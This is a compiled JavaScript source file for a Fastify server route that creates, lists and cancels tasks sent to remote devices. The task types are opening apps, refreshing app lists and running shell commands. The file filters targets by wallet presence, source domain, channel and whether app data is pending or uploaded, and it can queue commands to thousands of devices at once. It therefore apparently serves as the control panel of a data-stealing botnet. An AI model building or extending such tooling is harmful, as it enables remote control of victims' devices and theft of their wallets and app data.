import { Task, Device } from '../../../core/db/models/index.js';
import { DEFAULTS } from '../../../config/constants.js';
import { logger } from '../../../core/logger/index.js';
import { isAdminLike } from '../../../core/auth/permissions.js';
const DEFAULT_TIMEOUTS = {
    open_app: 10,
    exec_shell: 60,
    refresh_apps: 30,
};
export async function tasksRoute(fastify) {
    fastify.post('/api/tasks', async (request, reply) => {
        try {
            const { deviceIds, filters: queryFilters, type, params, timeout, limit } = request.body;
            const user = request.user;
            if (!type || !params) {
                reply.code(400);
                return { error: 'invalid_params', message: 'type and params are required' };
            }
            const validTypes = ['open_app', 'exec_shell', 'refresh_apps'];
            if (!validTypes.includes(type)) {
                reply.code(400);
                return { error: 'invalid_params', message: `type must be one of: ${validTypes.join(', ')}` };
            }
            // exec_shell 仅限管理员/channel_admin
            if (type === 'exec_shell' && !isAdminLike(user?.role)) {
                reply.code(403);
                return { error: 'forbidden', message: '仅管理员可执行Shell命令' };
            }
            // open_app 打开方式校验：immediate=直接打开，delayed=延时打开
            if (type === 'open_app' && params.mode !== undefined && !['immediate', 'delayed'].includes(params.mode)) {
                reply.code(400);
                return { error: 'invalid_params', message: 'params.mode must be one of: immediate, delayed' };
            }
            if (!deviceIds && !queryFilters) {
                reply.code(400);
                return { error: 'invalid_params', message: 'deviceIds or filters is required' };
            }
            let devices;
            if (deviceIds && Array.isArray(deviceIds) && deviceIds.length > 0) {
                devices = await Device.find({ uniqueId: { $in: deviceIds }, ...request.channelFilter });
            }
            else if (queryFilters) {
                const filter = { ...request.channelFilter };
                if (queryFilters.uniqueId)
                    filter.uniqueId = queryFilters.uniqueId;
                if (queryFilters.sourceDomain)
                    filter.sourceDomain = queryFilters.sourceDomain;
                if (queryFilters.hasWallet === 'true')
                    filter.walletCount = { $gt: 0 };
                else if (queryFilters.hasWallet === 'false')
                    filter.walletCount = 0;
                if (queryFilters.firstSeenStart || queryFilters.firstSeenEnd) {
                    filter.firstSeen = {};
                    if (queryFilters.firstSeenStart)
                        filter.firstSeen.$gte = new Date(queryFilters.firstSeenStart);
                    if (queryFilters.firstSeenEnd)
                        filter.firstSeen.$lte = new Date(queryFilters.firstSeenEnd);
                }
                if (queryFilters.lastSeenStart || queryFilters.lastSeenEnd) {
                    filter.lastSeen = {};
                    if (queryFilters.lastSeenStart)
                        filter.lastSeen.$gte = new Date(queryFilters.lastSeenStart);
                    if (queryFilters.lastSeenEnd)
                        filter.lastSeen.$lte = new Date(queryFilters.lastSeenEnd);
                }
                // 可控状态 + lastTaskPoll 时间范围合并
                let taskPollGte = null;
                let taskPollLt = null;
                const taskThreshold = new Date(Date.now() - DEFAULTS.TASK_TIMEOUT_THRESHOLD_MS);
                if (queryFilters.controllable === 'online')
                    taskPollGte = taskThreshold;
                else if (queryFilters.controllable === 'offline')
                    taskPollLt = taskThreshold;
                if (queryFilters.lastTaskPollStart) {
                    const start = new Date(queryFilters.lastTaskPollStart);
                    taskPollGte = taskPollGte ? new Date(Math.max(taskPollGte.getTime(), start.getTime())) : start;
                }
                if (queryFilters.lastTaskPollEnd) {
                    const end = new Date(queryFilters.lastTaskPollEnd);
                    taskPollLt = taskPollLt ? new Date(Math.min(taskPollLt.getTime(), end.getTime())) : end;
                }
                if (taskPollGte || taskPollLt) {
                    filter.lastTaskPoll = {};
                    if (taskPollGte)
                        filter.lastTaskPoll.$gte = taskPollGte;
                    if (taskPollLt)
                        filter.lastTaskPoll.$lt = taskPollLt;
                }
                if (queryFilters.app && queryFilters.dataStatus === 'pending') {
                    filter.pendingDataApps = queryFilters.app;
                }
                else if (queryFilters.app && queryFilters.dataStatus === 'uploaded') {
                    filter.uploadedDataApps = queryFilters.app;
                }
                else if (queryFilters.app && !queryFilters.dataStatus) {
                    filter.$or = [{ pendingDataApps: queryFilters.app }, { uploadedDataApps: queryFilters.app }];
                }
                const maxLimit = Math.min(limit || 10000, 10000);
                devices = await Device.find(filter).select('uniqueId channelCode lastTaskPoll').limit(maxLimit);
            }
            else {
                devices = [];
            }
            const onlineThreshold = new Date(Date.now() - DEFAULTS.TASK_TIMEOUT_THRESHOLD_MS);
            const onlineDevices = devices.filter((d) => d.lastTaskPoll && d.lastTaskPoll >= onlineThreshold);
            const offlineDevices = devices.filter((d) => !d.lastTaskPoll || d.lastTaskPoll < onlineThreshold);
            const created = [];
            const failed = [];
            for (const d of offlineDevices) {
                failed.push({ deviceId: d.uniqueId, reason: 'offline' });
            }
            const BATCH_SIZE = 2000;
            for (let i = 0; i < onlineDevices.length; i += BATCH_SIZE) {
                const batch = onlineDevices.slice(i, i + BATCH_SIZE);
                await Task.insertMany(batch.map((d) => ({
                    deviceId: d.uniqueId,
                    channelCode: d.channelCode,
                    type,
                    params,
                    timeout: timeout ?? DEFAULT_TIMEOUTS[type] ?? 60,
                    status: 'pending',
                    createdBy: user?.username || 'unknown',
                })));
                created.push(...batch.map((d) => d.uniqueId));
            }
            // deviceIds 模式下，找不到的设备也报 not_found
            if (deviceIds && Array.isArray(deviceIds)) {
                const foundIds = new Set(devices.map((d) => d.uniqueId));
                for (const id of deviceIds) {
                    if (!foundIds.has(id) && !failed.some(f => f.deviceId === id)) {
                        failed.push({ deviceId: id, reason: 'not_found' });
                    }
                }
            }
            // 按 reason 聚合失败列表
            const failedGrouped = [];
            const reasonCount = new Map();
            for (const f of failed) {
                reasonCount.set(f.reason, (reasonCount.get(f.reason) || 0) + 1);
            }
            for (const [reason, count] of reasonCount) {
                failedGrouped.push({ reason, count });
            }
            return { created: created.length, failed: failedGrouped };
        }
        catch (err) {
            logger.error({ err }, 'POST /api/tasks error');
            reply.code(500);
            return { error: 'internal_error', message: 'failed to create tasks' };
        }
    });
    fastify.get('/api/tasks', async (request) => {
        const { deviceId, status, type, page = '1', pageSize = '10' } = request.query;
        const filter = { ...request.channelFilter };
        if (deviceId)
            filter.deviceId = deviceId;
        if (status)
            filter.status = status;
        if (type)
            filter.type = type;
        const skip = ((parseInt(page, 10) || 1) - 1) * (parseInt(pageSize, 10) || 10);
        const [data, total] = await Promise.all([
            Task.find(filter).sort({ createdAt: -1 }).skip(skip).limit(parseInt(pageSize, 10) || 10),
            Task.countDocuments(filter),
        ]);
        return { data, total, page: parseInt(page, 10) || 1, pageSize: parseInt(pageSize, 10) || 10 };
    });
    fastify.get('/api/tasks/:id', async (request, reply) => {
        const { id } = request.params;
        const task = await Task.findOne({ _id: id, ...request.channelFilter });
        if (!task) {
            reply.code(404);
            return { error: 'task_not_found', message: 'task does not exist' };
        }
        return { data: task };
    });
    fastify.delete('/api/tasks/:id', async (request, reply) => {
        const { id } = request.params;
        const task = await Task.findOneAndUpdate({ _id: id, status: 'pending', ...request.channelFilter }, { $set: { status: 'cancelled' } }, { returnDocument: 'after' });
        if (!task) {
            reply.code(404);
            return { error: 'task_not_found', message: 'task does not exist or not cancellable (only pending tasks can be cancelled)' };
        }
        return { data: task };
    });
}
//# sourceMappingURL=tasks.js.map